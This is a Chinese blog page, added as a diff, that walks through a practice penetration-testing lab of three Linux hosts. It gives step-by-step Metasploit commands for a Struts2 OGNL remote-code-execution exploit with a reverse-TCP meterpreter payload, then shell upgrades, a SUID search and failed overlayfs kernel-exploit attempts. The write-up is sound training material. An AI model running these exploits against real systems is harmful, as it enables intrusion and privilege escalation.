@@ -1,0 +1,1324 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>THP-CSK 靶场 Linux 内网横向渗透全流程 - 欢迎入侵本站</title>
+
+  
+    <meta name="description" content="🛡️ THP-CSK 靶场 · Linux 内网横向渗透全流程 靶场编号： #189 · 难度方向： Web DMZ → 内网横向涉及技术： Struts2 RCE · 内核提权 · SSH 密钥复用 · SOCKS 代理穿透 · Jenkins 凭据解密 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wrold&#x2F;p&#x2F;19748562   📋 靶场概述 本次靶场共三台 Linux 主机，模拟">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THP-CSK 靶场 Linux 内网横向渗透全流程">
+<meta property="og:url" content="https://wr0ld.github.io/posts/5532e4a/">
+<meta property="og:site_name" content="欢迎入侵本站">
+<meta property="og:description" content="🛡️ THP-CSK 靶场 · Linux 内网横向渗透全流程 靶场编号： #189 · 难度方向： Web DMZ → 内网横向涉及技术： Struts2 RCE · 内核提权 · SSH 密钥复用 · SOCKS 代理穿透 · Jenkins 凭据解密 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wrold&#x2F;p&#x2F;19748562   📋 靶场概述 本次靶场共三台 Linux 主机，模拟">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-03-24T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-26T06:27:27.244Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="靶机渗透">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="横向移动">
+<meta property="article:tag" content="Jenkins">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="靶机渗透,提权,内网渗透,横向移动,Jenkins">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-24T12:00:00+08:00","dateModified":"2026-03-26T14:27:27+08:00","datePublished":"2026-03-24T12:00:00+08:00","description":"","headline":"THP-CSK 靶场 Linux 内网横向渗透全流程","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/5532e4a/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/5532e4a/","keywords":"靶机渗透, 提权, 内网渗透, 横向移动, Jenkins","thumbnailUrl":"/images/THP.png","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">欢迎入侵本站</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报</span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">cs魔改</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">fastjson代码审计（1.2.68 → 1.2.80）</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">java cc链</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">信息收集方法论</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">EDUSRC实战漏洞挖掘复盘（脱敏）</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-03-24T04:00:00.000Z">2026-03-24</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-03-26T06:27:27.244Z">2026-03-26</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>THP-CSK 靶场 Linux 内网横向渗透全流程</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="🛡️-THP-CSK-靶场-·-Linux-内网横向渗透全流程"><a href="#🛡️-THP-CSK-靶场-·-Linux-内网横向渗透全流程" class="headerlink" title="🛡️ THP-CSK 靶场 · Linux 内网横向渗透全流程"></a>🛡️ THP-CSK 靶场 · Linux 内网横向渗透全流程</h1><blockquote>
+<p><strong>靶场编号：</strong> #189 · <strong>难度方向：</strong> Web DMZ → 内网横向<br><strong>涉及技术：</strong> Struts2 RCE · 内核提权 · SSH 密钥复用 · SOCKS 代理穿透 · Jenkins 凭据解密</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wrold/p/19748562">https://www.cnblogs.com/wrold/p/19748562</a></p>
+</blockquote>
+<hr>
+<h2 id="📋-靶场概述"><a href="#📋-靶场概述" class="headerlink" title="📋 靶场概述"></a>📋 靶场概述</h2><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image1.png"></p>
+<p>本次靶场共三台 Linux 主机，模拟一个典型的企业内网”站库分离”架构：</p>
+<table>
+<thead>
+<tr>
+<th>主机 IP</th>
+<th>角色</th>
+<th>对外可达</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>172.16.250.10</code></td>
+<td>Web 服务器（入口机）</td>
+<td>✅ 可直接访问</td>
+</tr>
+<tr>
+<td><code>172.16.250.30</code></td>
+<td>内网 Web 应用</td>
+<td>❌ 仅内网访问</td>
+</tr>
+<tr>
+<td><code>172.16.250.50</code></td>
+<td>数据库服务器</td>
+<td>❌ 不出网</td>
+</tr>
+</tbody></table>
+<ul>
+<li>靶机账号密码：<code>hacker / changeme</code></li>
+<li>主要攻击路径：利用 <code>.10</code> 上的 Struts2 漏洞获取 Shell → 提权 → 横向移动到 <code>.30</code> 和 <code>.50</code></li>
+</ul>
+<h3 id="🗺️-整体攻击思路"><a href="#🗺️-整体攻击思路" class="headerlink" title="🗺️ 整体攻击思路"></a>🗺️ 整体攻击思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外网入口(.10)  →  代码执行 / 提权  →  内网横向(.30)  →  数据库(.50)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="📥-靶场文件下载"><a href="#📥-靶场文件下载" class="headerlink" title="📥 靶场文件下载"></a>📥 靶场文件下载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://secplanet.sfo2.cdn.digitaloceanspaces.com/THP-csk-lab.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image2.png"></p>
+<hr>
+<h2 id="🔧-环境搭建"><a href="#🔧-环境搭建" class="headerlink" title="🔧 环境搭建"></a>🔧 环境搭建</h2><p><strong>VMware 路径：</strong> 编辑 → 虚拟网络编辑器 → 更改设置</p>
+<p>修改子网 IP 为 <code>172.16.250.0</code>，类型保持”段内可通讯”即可，用来模拟内网隔离环境。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image3.png"></p>
+<hr>
+<h2 id="🔍-信息收集"><a href="#🔍-信息收集" class="headerlink" title="🔍 信息收集"></a>🔍 信息收集</h2><p>打开三台虚拟主机，先扫一下存活主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 172.16.250.0/24</span><br></pre></td></tr></table></figure>
+
+<p>刚好三台，符合预期。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image4.png"></p>
+<p>然后对这三台机器做全端口详细扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 172.16.250.10 172.16.250.30 172.16.250.50</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果汇总：</p>
+<table>
+<thead>
+<tr>
+<th>IP</th>
+<th>开放端口 &#x2F; 特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>172.16.250.10</code></td>
+<td>22 (SSH)、80 (nginx + OpenCms)、8009 (AJP)、8080 (Tomcat 7)</td>
+</tr>
+<tr>
+<td><code>172.16.250.30</code></td>
+<td>仅 22 (SSH)</td>
+</tr>
+<tr>
+<td><code>172.16.250.50</code></td>
+<td>仅 22 (SSH)</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>💡 很明显：**.10 是入口机，.30 &#x2F; .50 是横向移动目标**，只有 SSH 对外，说明内网还有服务隐藏着。</p>
+</blockquote>
+<hr>
+<h2 id="🌐-Web-踩点"><a href="#🌐-Web-踩点" class="headerlink" title="🌐 Web 踩点"></a>🌐 Web 踩点</h2><p><strong>访问 80 端口：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.250.10/</span><br></pre></td></tr></table></figure>
+
+<p>跑的是 OpenCms：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image5.png"></p>
+<p><strong>访问 8080 端口：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.250.10:8080/</span><br></pre></td></tr></table></figure>
+
+<p>标准的 Tomcat 页面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image6.png"></p>
+<p>尝试在 Kali 上搜 OpenCms 的漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opencms</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image7.png"></p>
+<p>基本都是 XXE 文件读取，没什么直接 RCE 的利用，先搁置。</p>
+<p>再跑一下目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.16.250.10/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image8.png"></p>
+<p>也没发现啥有用的。到这里其实有点没头绪，后来翻 WP 才知道有这么一个路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.250.10/struts2-showcase/showcase.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image9.png"></p>
+<p>这是 <strong>Struts2 Showcase Demo</strong>，官方演示程序，很多靶场都会装这个当入口。看到这个基本就知道该怎么打了。</p>
+<hr>
+<h2 id="💥-漏洞利用：Struts2-RCE（CVE-2017-5638）"><a href="#💥-漏洞利用：Struts2-RCE（CVE-2017-5638）" class="headerlink" title="💥 漏洞利用：Struts2 RCE（CVE-2017-5638）"></a>💥 漏洞利用：Struts2 RCE（CVE-2017-5638）</h2><p>打开 MSF，搜 Struts2：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search struts2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image10.png"></p>
+<p>选用模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/struts2_content_type_ognl</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>📌 对应漏洞：<strong>CVE-2017-5638</strong>，通过 Content-Type 头注入 OGNL 表达式实现远程代码执行。</p>
+</blockquote>
+<p>注意默认 payload 是 Windows 的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image11.png"></p>
+<p>目标是 Linux，要手动切换：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.16.250.10</span><br><span class="line"><span class="built_in">set</span> RPORT 80</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image12.png"></p>
+<p>配置没问题，直接打：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image13.png"></p>
+<p>✅ 成功拿到 <code>tomcat</code> 权限，下一步是提权到 root。</p>
+<hr>
+<h2 id="⬆️-提权"><a href="#⬆️-提权" class="headerlink" title="⬆️ 提权"></a>⬆️ 提权</h2><p>先获取交互式 Shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>  <span class="comment">#不行</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ 注意：这台机器没有 <code>python</code>，只有 <code>python3</code>。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image14.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image15.png"></p>
+<p>或者用这个也行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image16.png"></p>
+<p>方法很多，选一个能用的就行。</p>
+<h3 id="🔎-提权侦察"><a href="#🔎-提权侦察" class="headerlink" title="🔎 提权侦察"></a>🔎 提权侦察</h3><p>先找 SUID 文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>没啥能用的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image17.png"></p>
+<p>试一下 sudo：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+
+<p>需要密码，跳过。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image18.png"></p>
+<p>查内核版本，看看有没有内核漏洞可以打：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image19.png"></p>
+<hr>
+<h3 id="❌-尝试-overlayfs（失败）"><a href="#❌-尝试-overlayfs（失败）" class="headerlink" title="❌ 尝试 overlayfs（失败）"></a>❌ 尝试 overlayfs（失败）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit overlayfs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image20.png"></p>
+<p>复制利用代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux/local/37292.c</span><br></pre></td></tr></table></figure>
+
+<p>退回 MSF session，上传文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload 37292.c /tmp/37292.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image21.png"></p>
+<p>编译并执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o exp</span><br><span class="line"><span class="built_in">chmod</span> 777 ./exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image22.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image23.png"></p>
+<p>有警告但能编译。结果执行发现不适配当前内核环境，宣告失败。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image24.png"></p>
+<hr>
+<h3 id="❌-Metasploit-overlayfs-模块（失败）"><a href="#❌-Metasploit-overlayfs-模块（失败）" class="headerlink" title="❌ Metasploit overlayfs 模块（失败）"></a>❌ Metasploit overlayfs 模块（失败）</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image25.png"></p>
+<blockquote>
+<p>📌 模块：<code>40688.rb</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/local/overlayfs_priv_esc</span><br><span class="line">background</span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
